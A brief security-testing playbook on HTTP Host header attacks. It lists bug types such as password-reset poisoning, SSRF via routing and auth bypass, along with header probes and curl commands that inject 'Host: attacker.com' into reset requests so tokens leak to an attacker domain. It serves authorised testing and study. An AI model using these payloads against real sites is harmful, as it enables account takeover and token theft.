# HTTP Host header attacks — playbook

## when to try
- Always probe; takes 30 seconds.
- Especially: password-reset flows, email-link generation, OAuth redirects,
  content-served-from-host, multi-tenant setups.

## bug archetypes
- **Password reset poisoning**: app generates the reset link from `Host`/`X-Forwarded-Host`. Set it to `attacker.com` → victim's email contains a link to `https://attacker.com/reset?token=...` → token sent to attacker.
- **Open redirect via Host**: response `Location` reflects Host.
- **Web cache poisoning** via `Host`/`X-Forwarded-Host` (see `web-cache-poisoning.md`).
- **SSRF via routing** — internal routing accepts arbitrary `Host` and forwards to that backend (`Host: localhost`, `Host: internal.svc.local`).
- **Authentication bypass**: app trusts `Host` to decide admin-vs-public namespace. `Host: admin.target.local` from outside → admin UI.
- **Virtual host confusion**: TLS cert covers `*.target.com` and the app routes by Host without validating cert binding → access internal vhosts.

## probes
- Direct: `Host: attacker.com`.
- Override: `X-Forwarded-Host: attacker.com`, `X-Forwarded-Server`, `X-Host`, `Forwarded: host=attacker.com`.
- Absolute URL trick: `GET https://attacker.com/foo HTTP/1.1\nHost: target.com` (line 1 wins for some servers).
- Duplicated Host: `Host: target.com\r\nHost: attacker.com`.
- Indented header: `\tHost: attacker.com` (some parsers honour, some don't).

## confirmation flow
1. Reset password as your test account. Capture the reset email.
2. Repeat with `Host: attacker.com` (or `X-Forwarded-Host`).
3. Did the email link host change? → Confirmed.

## exploitation snippet
```bash
# Reset poisoning probe
curl -sk -X POST https://t/reset -H 'Host: attacker.com' -d 'email=you@you.com'
# now check your email for the reset link's domain
```

```bash
# X-Forwarded-Host
curl -sk -X POST https://t/reset -H 'X-Forwarded-Host: attacker.com' -d 'email=you@you.com'
```

## caveats
- Many CDNs strip/rewrite `Host` between edge and origin — direct host poisoning may not reach origin.
- Reset-poisoning often acceptable as Medium because it requires the victim to click — programs vary.

## provenance
James Kettle "HTTP Host header attacks" 2019. PortSwigger Host Header labs.
